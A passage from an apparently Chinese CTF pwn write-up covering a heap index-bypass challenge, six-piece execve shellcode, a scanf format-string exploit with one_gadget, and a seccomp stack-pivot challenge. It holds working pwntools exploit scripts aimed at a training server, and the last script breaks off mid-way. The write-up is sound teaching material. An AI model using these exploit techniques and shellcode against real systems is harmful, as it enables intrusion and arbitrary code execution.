<p>add_chunk 0的时候，size在 0x4040c8 + (0x20 * 8) &#x3D; 0x4041c8 这个位置，</p>
<p>edit是这样取大小的(unsigned int)qword_4040C8[v1 + 32])，所以得add chunk[32]才能把大小写进去，但是 if ( idx[0] &gt;&#x3D; 0 &amp;&amp; idx[0] &lt; qword_4042C0 ) 这里有一个判断，qword_4042C0 &#x3D;&#x3D; 32，所以直接输入32是不行的，得先把qword_4042C0 修改成一个大于32的数，才能写大小。</p>
<pre class="line-numbers language-none"><code class="language-none">.text:000000000040127C 48 83 C0 20                   add     rax, 20h ; &#39; &#39;
.text:0000000000401280 48 8D 0C C5 00 00 00 00       lea     rcx, ds:0[rax*8]
.text:0000000000401288 48 8D 05 39 2E 00 00          lea     rax, qword_4040C8
.text:000000000040128F 48 89 14 01                   mov     [rcx+rax], rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">int edit_chunk()
&#123;
  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-4h] BYREF

  printf(&quot;idx:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
  if ( !qword_4040C8[v1] )
    return puts(&quot;no chunk&quot;);
  printf(&quot;content:&quot;);
  return sub_401354(qword_4040C8[v1], (unsigned int)qword_4040C8[v1 + 32]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">from pwn import *
from LibcSearcher import *

context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;,log_level&#x3D;&#39;debug&#39;)
elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;heap1&#39;)
libc &#x3D; elf.libc

is_debug &#x3D; 1

if(is_debug):
    p &#x3D; process()
else:
    ip &#x3D; &quot;training.0rays.club&quot;
    port &#x3D; 10093
    p &#x3D; remote(ip,port)

# gdb.attach(p)
g &#x3D; lambda x: gdb.attach(x)

# send() sendline() sendafter() sendlineafter()
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x,y: p.sendafter(x,y)
sla &#x3D; lambda x,y: p.sendlineafter(x,y)

# recv() recvline() recvuntil()
r &#x3D; lambda x: p.recv(x)
rl &#x3D; lambda : p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)

r_leek_libc_64 &#x3D; lambda : u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
r_leek_libc_32 &#x3D; lambda : u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])


def add_chunk(idx, size):
    sla(&quot;choice:&quot;, &#39;1&#39;)
    sla(&quot;idx:&quot;, str(idx))
    sla(&quot;size:&quot;, str(size))

def edit_chunk(idx, content):
    sla(&quot;choice:&quot;, &#39;3&#39;)
    sla(&quot;idx:&quot;, str(idx))
    sla(&quot;content:&quot;, content)

# qword_4042C0
add_chunk(31, 0xffff)
add_chunk(32, 32)
add_chunk(0, 0x4040c0)
edit_chunk(32, p64(0x656572545F676553))

sl(&#39;5&#39;)

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="The-Legend-Of-ShellCode"><a href="#The-Legend-Of-ShellCode" class="headerlink" title="The Legend Of ShellCode"></a>The Legend Of ShellCode</h2><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char s[16]; &#x2F;&#x2F; [rsp+0h] [rbp-70h] BYREF
  char buf[16]; &#x2F;&#x2F; [rsp+10h] [rbp-60h] BYREF
  char v6[16]; &#x2F;&#x2F; [rsp+20h] [rbp-50h] BYREF
  char v7[16]; &#x2F;&#x2F; [rsp+30h] [rbp-40h] BYREF
  char v8[16]; &#x2F;&#x2F; [rsp+40h] [rbp-30h] BYREF
  char v9[24]; &#x2F;&#x2F; [rsp+50h] [rbp-20h] BYREF
  unsigned __int64 v10; &#x2F;&#x2F; [rsp+68h] [rbp-8h]

  v10 &#x3D; __readfsqword(0x28u);
  init(argc, argv, envp);
  memset(s, 195, 0x60uLL);
  puts(&quot;Welcome2TheLegendOfShellCode!&quot;);
  puts(&quot;Now show me your wisdom:&quot;);
  read(0, s, 9uLL);
  puts(&quot;Now show me your courage:&quot;);
  read(0, buf, 9uLL);
  puts(&quot;Now show me your strength:&quot;);
  read(0, v6, 9uLL);
  puts(&quot;Now show me your flesh:&quot;);
  read(0, v7, 9uLL);
  puts(&quot;Now show me your thought:&quot;);
  read(0, v8, 9uLL);
  puts(&quot;Now show me your soul:&quot;);
  read(0, v9, 9uLL);
  puts(&quot;Keep going!Wish you could bring peace to hararu&quot;);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>栈上有可执行的权限，有六次输入，每次输入9个字节，最后会去call rbp - 0x70。这题比较麻烦的地方是算指令大小吧。用jmp short连接这六个位置，jmp加一个偏移 占两个字节。 写binsh字符串的话，要拆开来写，把高低位拆开然后拼起来，最后push到栈中取通过rsp取binsh的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./code'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"training.0rays.club"</span>
    port <span class="token operator">=</span> <span class="token number">10073</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>



shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    mov rax,0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    xor esi, esi
    xor edx, edx
    syscall
'''</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_jmp</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b'\xEB'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>

<span class="token comment"># print(len(generate_jmp(5)))</span>
<span class="token comment"># set register rax = 0x3b esi = 0 edx = 0 rdi = binsh addr</span>

shellcode1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
xor esi,esi
xor edx,edx
xor rax,rax
'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> generate_jmp<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>


shellcode2 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    mov eax,0x68732f
'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> generate_jmp<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

shellcode3 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    shl rax, 32         
'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> generate_jmp<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>

shellcode4 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    add rax,0x6e69622f
'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> generate_jmp<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>


shellcode5 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    push rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    syscall                                 
'''</span><span class="token punctuation">)</span>

<span class="token comment"># print(len(shellcode2))</span>


ru<span class="token punctuation">(</span><span class="token string">"Now show me your wisdom:\n"</span><span class="token punctuation">)</span>
<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span>


ru<span class="token punctuation">(</span><span class="token string">"Now show me your courage:\n"</span><span class="token punctuation">)</span>
<span class="token comment"># s(b'\x90' * 9)</span>
s<span class="token punctuation">(</span>shellcode2<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Now show me your strength:\n"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>shellcode3<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Now show me your flesh:\n"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>shellcode4<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Now show me your thought:\n"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>shellcode5<span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>

ru<span class="token punctuation">(</span><span class="token string">"Now show me your soul:\n"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span><span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="123go"><a href="#123go" class="headerlink" title="123go"></a>123go</h2><p>第一次做和scanf相关的格式化字符串漏洞，联想到printf解析格式化字符串的方式，%n$ 这个表达式前六个参数是取寄存器的数据，往后是从rsp开始取数据，那？能不能用%n$s 取栈上的指针，通过这个指针写数据？ 试了一下成功了。那只需要泄露一个libc 相关的地址，算出libc_base 然后 + one_gadget写返回地址就好了，看了一下one_gadget的约束也刚刚好满足。不过看了一圈没有指向返回地址的指针，那找一个指向栈的指针，把返回地址的位置写进去，就可以通过这个位置使用scanf修改返回地址了</p>
<pre class="line-numbers language-none"><code class="language-none">18:00c0│       0x7fffffffe2a8 —▸ 0x7fffffffe318 —▸ 0x7fffffffe5d9 ◂— &#39;SHELL&#x3D;&#x2F;bin&#x2F;bash&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">26:0130│     0x7fffffffe318 —▸ 0x7fffffffe5d9 ◂— &#39;SHELL&#x3D;&#x2F;bin&#x2F;bash&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./123go'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"training.0rays.club"</span>
    port <span class="token operator">=</span> <span class="token number">10096</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"%9$p-%13$p-%11$p"</span>
sa<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Hello:"</span><span class="token punctuation">)</span>
leak_canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">147587</span>

success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

one_gadget<span class="token operator">=</span><span class="token number">0xe3b01</span>

sa<span class="token punctuation">(</span><span class="token string">"context:"</span><span class="token punctuation">,</span><span class="token string">"%29$d"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"context:"</span><span class="token punctuation">,</span><span class="token string">"%43$d"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>one_gadget<span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h2><p>有一个沙箱，不过不是把execve禁用了，是只能执行execve和execveat</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;cbctf&#x2F;pwn&#x2F;reg$ seccomp-tools dump .&#x2F;reg
 line  CODE  JT   JF      K
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number
 0003: 0x15 0x00 0x02 0x0000003b  if (A !&#x3D; execve) goto 0006
 0004: 0x15 0x00 0x01 0x00000142  if (A !&#x3D; execveat) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看了一下发现 buf[32]刚刚好是能取到 rbp的，如果把rbp改了 可以通过两次leave ret进行栈迁移，先在buf上布置好新栈，最后修改rbp</p>
<p>gdb动调的时候发现，buf上有很多libc相关的地址，add函数那 value是可以输入负数的，那把libc的地址通过 set 中类似于 memcpy的这一部分，配合上add，就能算出libc_base，打onegadget。</p>
<pre class="line-numbers language-none"><code class="language-none">if ( v3 &#x3D;&#x3D; 2 )
 &#123;
   result &#x3D; v2;
   if ( v2 &gt;&#x3D; 0 )
   &#123;
     result &#x3D; v2;
     if ( v2 &lt;&#x3D; 32 )
     &#123;
       result &#x3D; *(_QWORD *)(8 * v2 + a1);
       *(_QWORD *)(8LL * (int)v4 + a1) &#x3D; result;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">if ( v2 &lt;&#x3D; 32 )
&#123;
  result &#x3D; 8LL * (int)v4 + a1;
  *(_QWORD *)result +&#x3D; *(_QWORD *)(8 * v2 + a1);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>迁移过后 rdx &#x3D;&#x3D; 0，r10 不为空，去libc里找了一下 找到这个gadget可以清空 r10，然后 rbp - 0x78 必须是可写的，那可以在布置栈的时候 buf[0] 设置成一个 buf上的地址，栈迁移的时候 执行第二次leave的时候，rbp就到buf上了。</p>
<pre class="line-numbers language-none"><code class="language-none"># 0x0000000000149708 : xor r10d, r10d ; mov eax, r10d ; ret
    
# 0xebc85 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL
#   [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import <span class="token operator">*</span>
from LibcSearcher import <span class="token operator">*</span>

<span class="token function">context</span><span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token char">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token char">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token function">ELF</span><span class="token punctuation">(</span><span class="token char">'./reg'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token operator">:</span>
    p <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token operator">:</span>
    ip <span class="token operator">=</span> <span class="token string">"training.0rays.club"</span>
    port <span class="token operator">=</span> <span class="token number">10093</span>
    p <span class="token operator">=</span> <span class="token function">remote</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">gdb</span><span class="token expression"><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
g <span class="token operator">=</span> lambda x<span class="token operator">:</span> gdb<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">send</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">sendline</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">sendafter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">sendlineafter</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
s <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> lambda x<span class="token punctuation">,</span>y<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendafter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> lambda x<span class="token punctuation">,</span>y<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">sendlineafter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">recv</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">recvuntil</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
r <span class="token operator">=</span> lambda x <span class="token operator">=</span> None<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x is None <span class="token keyword">else</span> p<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
